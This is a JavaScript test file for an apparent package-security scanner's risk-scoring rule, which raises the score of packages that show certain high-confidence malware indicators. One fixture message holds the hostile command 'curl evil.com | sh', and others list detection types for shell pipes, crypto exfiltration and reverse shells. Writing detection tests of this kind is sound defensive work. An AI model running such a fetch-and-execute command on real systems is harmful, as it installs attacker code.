'use strict';

const { test, assert } = require('../test-utils');
const {
  SINGLE_FIRE_CRITICAL_TYPES,
  SINGLE_FIRE_CRITICAL_FLOOR,
  applySingleFireCriticalFloor
} = require('../../src/scoring.js');

function makeResult(threats, riskScore) {
  return {
    threats,
    summary: {
      riskScore: riskScore,
      riskLevel:
        riskScore >= 75 ? 'CRITICAL' : riskScore >= 50 ? 'HIGH' :
          riskScore >= 25 ? 'MEDIUM' : riskScore > 0 ? 'LOW' : 'SAFE'
    }
  };
}

async function runSingleFireCriticalFloorTests() {
  console.log('\n=== SINGLE-FIRE CRITICAL FLOOR TESTS (Hybrid v3 Phase 1) ===\n');

  test('Floor lifts low-scoring package with known_malicious_hash@HIGH to 75', () => {
    const result = makeResult([
      { type: 'known_malicious_hash', severity: 'HIGH', file: 'index.js', message: 'IOC hash match' }
    ], 12);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 1, `Expected 1 trigger, got ${triggers.length}`);
    assert(result.summary.riskScore === SINGLE_FIRE_CRITICAL_FLOOR,
      `Expected score ${SINGLE_FIRE_CRITICAL_FLOOR}, got ${result.summary.riskScore}`);
    assert(result.summary.riskLevel === 'CRITICAL', `Expected CRITICAL, got ${result.summary.riskLevel}`);
  });

  test('Floor lifts low-scoring package with lifecycle_shell_pipe@CRITICAL to 75', () => {
    const result = makeResult([
      { type: 'lifecycle_shell_pipe', severity: 'CRITICAL', file: 'package.json', message: 'curl evil.com | sh' }
    ], 25);
    applySingleFireCriticalFloor(result);
    assert(result.summary.riskScore === SINGLE_FIRE_CRITICAL_FLOOR,
      `Expected ${SINGLE_FIRE_CRITICAL_FLOOR}, got ${result.summary.riskScore}`);
    assert(result.summary.riskLevel === 'CRITICAL');
  });

  test('Floor leaves higher score unchanged (raises only, never lowers)', () => {
    const result = makeResult([
      { type: 'known_malicious_package', severity: 'CRITICAL', file: 'package.json', message: 'IOC match' }
    ], 92);
    applySingleFireCriticalFloor(result);
    assert(result.summary.riskScore === 92, `Expected 92, got ${result.summary.riskScore}`);
    assert(result.summary.riskLevel === 'CRITICAL');
  });

  test('Floor does NOT trigger on LOW severity (severity gate)', () => {
    const result = makeResult([
      { type: 'lifecycle_shell_pipe', severity: 'LOW', file: 'package.json', message: 'borderline match' }
    ], 12);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 0, `Expected 0 triggers (LOW filtered), got ${triggers.length}`);
    assert(result.summary.riskScore === 12, `Expected 12, got ${result.summary.riskScore}`);
  });

  test('Floor does NOT trigger on MEDIUM severity (severity gate)', () => {
    const result = makeResult([
      { type: 'known_malicious_hash', severity: 'MEDIUM', file: 'x.js', message: 'medium-confidence match' }
    ], 30);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 0, `Expected 0 triggers (MEDIUM filtered), got ${triggers.length}`);
    assert(result.summary.riskScore === 30, `Expected 30 unchanged, got ${result.summary.riskScore}`);
  });

  test('Floor ignores threats not in SINGLE_FIRE_CRITICAL_TYPES', () => {
    const result = makeResult([
      { type: 'reverse_shell', severity: 'CRITICAL', file: 'x.js', message: 'reverse shell' },
      { type: 'cross_file_dataflow', severity: 'CRITICAL', file: 'y.js', message: 'cross-file taint' }
    ], 40);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 0, `Non-allowlisted types should not trigger, got ${triggers.length}`);
    assert(result.summary.riskScore === 40, `Score should be unchanged, got ${result.summary.riskScore}`);
  });

  test('Floor returns details on triggering threat (type, severity, file)', () => {
    const result = makeResult([
      { type: 'shai_hulud_marker', severity: 'CRITICAL', file: 'package.json', message: 'Shai-Hulud worm artifact' }
    ], 5);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 1);
    assert(triggers[0].type === 'shai_hulud_marker');
    assert(triggers[0].severity === 'CRITICAL');
    assert(triggers[0].file === 'package.json');
  });

  test('Floor handles multiple single-fire types: reports all triggers, applies once', () => {
    const result = makeResult([
      { type: 'known_malicious_package', severity: 'HIGH', file: 'package.json', message: 'name match' },
      { type: 'pypi_malicious_package', severity: 'HIGH', file: 'setup.py', message: 'pypi match' }
    ], 20);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 2, `Expected 2 triggers, got ${triggers.length}`);
    assert(result.summary.riskScore === SINGLE_FIRE_CRITICAL_FLOOR);
  });

  test('Floor is a no-op on empty / malformed result', () => {
    assert(applySingleFireCriticalFloor(null).length === 0);
    assert(applySingleFireCriticalFloor({}).length === 0);
    assert(applySingleFireCriticalFloor({ summary: { riskScore: 10 } }).length === 0);
    assert(applySingleFireCriticalFloor({ threats: [], summary: { riskScore: 10 } }).length === 0);
  });

  test('SINGLE_FIRE_CRITICAL_TYPES set composition is the validated 10-type list', () => {
    const expected = new Set([
      'known_malicious_hash',
      'known_malicious_package',
      'pypi_malicious_package',
      'shai_hulud_marker',
      'lifecycle_shell_pipe',
      'gyp_phantom_exec',
      'crypto_exfil',
      'install_native_drop_exec',
      'ioc_string_match',
      'text_payload_as_font_asset'
    ]);
    assert(SINGLE_FIRE_CRITICAL_TYPES.size === expected.size,
      `Expected ${expected.size} types, got ${SINGLE_FIRE_CRITICAL_TYPES.size}`);
    for (const t of expected) {
      assert(SINGLE_FIRE_CRITICAL_TYPES.has(t), `Missing expected type: ${t}`);
    }
  });

  // ── ioc_string_match: CRITICAL floors, HIGH does NOT (per-type severity gate) ──
  // The HIGH string IOCs are deliberately non-unique (getSignaturesForAddress = a real Solana
  // web3.js method, huggingface.co/api/models = a legit URL). Flooring HIGH would false-lift
  // every benign Solana/HuggingFace package to 75 — the gate MUST hold at CRITICAL.
  test('Floor lifts a lone CRITICAL ioc_string_match (campaign-unique wallet) to 75', () => {
    const result = makeResult([
      { type: 'ioc_string_match', severity: 'CRITICAL', file: 'babel.config.cjs',
        message: 'wallet 0xa322… (nullreceiver-2026-08)' }
    ], 20);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 1, `Expected 1 trigger, got ${triggers.length}`);
    assert(result.summary.riskScore === SINGLE_FIRE_CRITICAL_FLOOR,
      `Expected ${SINGLE_FIRE_CRITICAL_FLOOR}, got ${result.summary.riskScore}`);
  });

  test('Floor does NOT lift a HIGH ioc_string_match (non-unique string, FPR guard)', () => {
    const result = makeResult([
      { type: 'ioc_string_match', severity: 'HIGH', file: 'client.js',
        message: 'getSignaturesForAddress (glassworm-2026) — also a real Solana web3.js method' }
    ], 10);
    const triggers = applySingleFireCriticalFloor(result);
    assert(triggers.length === 0, `HIGH string IOC must NOT floor (per-type CRITICAL gate), got ${triggers.length}`);
    assert(result.summary.riskScore === 10, `Score must stay 10, got ${result.summary.riskScore}`);
  });

  test('Floor lifts a lone CRITICAL text_payload_as_font_asset (.woff2 loader) to 75', () => {
    const result = makeResult([
      { type: 'text_payload_as_font_asset', severity: 'CRITICAL', file: 'public/fonts/fa-solid-400.woff2',
        message: 'plaintext JS shipped as a font (PolinRider)' }
    ], 25);
    applySingleFireCriticalFloor(result);
    assert(result.summary.riskScore === SINGLE_FIRE_CRITICAL_FLOOR,
      `Expected ${SINGLE_FIRE_CRITICAL_FLOOR}, got ${result.summary.riskScore}`);
  });

  test('Floor preserves riskLevel string consistency with new score', () => {
    const result = makeResult([
      { type: 'known_malicious_hash', severity: 'HIGH', file: 'x', message: 'm' }
    ], 0);
    applySingleFireCriticalFloor(result);
    assert(result.summary.riskLevel === 'CRITICAL',
      `riskLevel should be CRITICAL after floor, got ${result.summary.riskLevel}`);
  });
}

module.exports = { runSingleFireCriticalFloorTests };
